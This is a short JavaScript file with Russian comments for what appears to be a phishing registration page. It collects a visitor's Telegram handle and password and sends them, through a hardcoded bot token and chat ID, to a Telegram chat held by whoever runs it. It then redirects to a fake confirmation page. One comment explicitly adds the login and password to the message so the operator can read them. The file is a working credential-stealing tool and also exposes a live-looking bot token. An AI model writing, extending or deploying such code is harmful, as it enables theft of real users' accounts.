let BOT_TOKEN = "8200701594:AAGhsHSh7D7X5PHApcfLBmkPY6zKhUw9mRs";
let CHAT_ID = "5372569828"; // Убрали буквы "ч", оставь только свои цифры ID

let sendData = () => {
  let telegram = document.getElementById("@Telegram.me").value;
  let password = document.getElementById("Password").value;
  let btn = document.getElementById("btn");

  let code = Math.floor(Math.random() * 1000);
  // Давай добавим в текст сообщения еще логин и пароль, чтобы ты видел их в телеграме
  let text = `Новая регистрация:\nТелега: ${telegram}\nПароль: ${password}\nКод подтверждения: ${code}`;

  // Сохраняем код для страницы conf.html
  sessionStorage.setItem("pendingCode", String(code));

  btn.disabled = true;
  btn.textContent = "sending...";

  // Отправка данных в Telegram бота
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: text }),
  })
    .then((res) => res.json())
    .then((data) => {
      if (data.ok) {
        // Чёткий и надежный путь для Vercel:
        window.location.href = "/conf/conf.html";
      } else {
        btn.disabled = false;
        btn.textContent = "register";
        alert("Ошибка Telegram API. Проверь токен или Chat ID.");
      }
    })
    .catch(() => {
      btn.disabled = false;
      btn.textContent = "register";
      alert("Ошибка сети. Попробуй еще раз.");
    });
};